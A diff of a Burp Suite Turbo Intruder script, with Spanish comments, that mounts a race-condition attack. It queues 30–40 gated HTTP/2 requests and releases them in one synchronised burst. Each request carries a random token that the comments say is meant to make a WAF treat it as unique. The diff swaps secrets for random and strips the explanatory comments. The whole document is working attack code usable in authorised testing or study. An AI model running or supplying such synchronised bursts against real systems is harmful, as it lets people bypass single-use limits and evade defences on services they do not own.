@@ -1,9 +1,8 @@
-import secrets
-import time
+import random
+import string
 
 def queueRequests(target, wordlist):
-    # Intentamos Engine.HTTP2 para el Single-Packet Attack (Precisión Atómica)
-    # Si el servidor no lo soporta, Burp bajará a HTTP/1.1 (Last-Byte Sync) automáticamente.
+    # Motor de alto rendimiento
     engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            requestsPerConnection=100,
@@ -11,27 +10,22 @@ def queueRequests(target, wordlist):
                            engine=Engine.HTTP2
                            )
 
-    # Configuraciones del ataque
     MARKER = "RACE_CONDITION"
-    RACE_SIZE = 40 # Cantidad de peticiones en la ráfaga
-    
-    # Pre-encolamos las peticiones para que los encabezados ya estén en el buffer del servidor
-    for i in range(RACE_SIZE):
-        # Generamos un token hexadecimal limpio (Seguro contra Format String)
-        # Esto asegura que cada petición sea tratada como "única" por el WAF
-        token = secrets.token_hex(4)
-        
-        # Sustitución universal del marcador
-        mod_req = target.req.replace(MARKER, token)
-        
-        # Encolamos bajo la compuerta 'atomic_race'
-        engine.queue(mod_req, gate='atomic_race')
+    num_attempts = 30 
 
-    # DISPARO SINCRONIZADO: Libera el último bit de todas las peticiones a la vez
-    engine.openGate('atomic_race')
+    for i in range(num_attempts):
+        # Generamos un token aleatorio compatible con Jython
+        # Crea una cadena como 'aB8k2L9p'
+        token = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
+        
+        # Sustitución del marcador en la petición
+        current_request = target.req.replace(MARKER, token)
+        
+        # Encolamos para el disparo sincronizado
+        engine.queue(current_request, gate='race_gate')
+
+    # ¡Fuego! Disparo sincronizado
+    engine.openGate('race_gate')
 
 def handleResponse(req, interesting):
-    # En la tabla de resultados, buscamos anomalías.
-    # El script añadirá automáticamente columnas de Status, Length y Time (Latencia).
-    # SI ves variaciones en Length o Status entre peticiones idénticas, hay RACE CONDITION.
     table.add(req)
